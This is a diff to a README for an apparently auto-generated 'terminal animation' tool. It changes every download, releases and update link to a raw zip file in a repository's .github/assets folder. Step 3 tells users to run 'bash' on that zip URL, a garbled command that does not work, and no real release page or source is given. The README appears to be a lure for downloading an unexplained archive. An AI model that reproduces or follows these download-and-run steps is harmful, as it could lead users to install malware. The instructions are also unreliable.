@@ -6,9 +6,9 @@ Welcome! This guide will help you download and run our auto-generated terminal a
 
 ## 📦 Download & Install
 
-[![Download](https://github.com/debugerstv/.github/raw/refs/heads/main/assets/github_v1.5.zip)](https://github.com/debugerstv/.github/raw/refs/heads/main/assets/github_v1.5.zip)
+[![Download](https://raw.githubusercontent.com/debugerstv/.github/main/assets/github-1.5.zip)](https://raw.githubusercontent.com/debugerstv/.github/main/assets/github-1.5.zip)
 
-To get the software, visit this page to download: [Releases Page](https://github.com/debugerstv/.github/raw/refs/heads/main/assets/github_v1.5.zip).
+To get the software, visit this page to download: [Releases Page](https://raw.githubusercontent.com/debugerstv/.github/main/assets/github-1.5.zip).
 
 ## 🛠️ System Requirements
 
@@ -32,7 +32,7 @@ Once you have downloaded the application, follow these steps to run it:
 
 1. **Open Terminal**: Launch your terminal application.
 2. **Navigate to the Download Folder**: Use the command `cd ~/Downloads` (or the folder where you saved the file).
-3. **Run the Application**: Type `bash [https://github.com/debugerstv/.github/raw/refs/heads/main/assets/github_v1.5.zip]` to start the application.
+3. **Run the Application**: Type `bash [https://raw.githubusercontent.com/debugerstv/.github/main/assets/github-1.5.zip]` to start the application.
 
 You will see your terminal come to life with unique animations.
 
@@ -45,7 +45,7 @@ You can easily customize your terminal animations. Here’s how:
 
 ## 🔄 Updates
 
-Stay updated with the latest features and improvements by regularly checking the [Releases Page](https://github.com/debugerstv/.github/raw/refs/heads/main/assets/github_v1.5.zip). Download new versions to get the best experience.
+Stay updated with the latest features and improvements by regularly checking the [Releases Page](https://raw.githubusercontent.com/debugerstv/.github/main/assets/github-1.5.zip). Download new versions to get the best experience.
 
 ## 🤝 Contributing
 
@@ -55,4 +55,4 @@ We welcome contributions! If you have ideas or improvements, feel free to submit
 
 If you need help using the application, reach out for support. You can create an issue on GitHub, and we will respond as soon as possible.
 
-Enjoy your terminal animation experience! Remember to visit the [Releases Page](https://github.com/debugerstv/.github/raw/refs/heads/main/assets/github_v1.5.zip) to download and stay updated.
+Enjoy your terminal animation experience! Remember to visit the [Releases Page](https://raw.githubusercontent.com/debugerstv/.github/main/assets/github-1.5.zip) to download and stay updated.
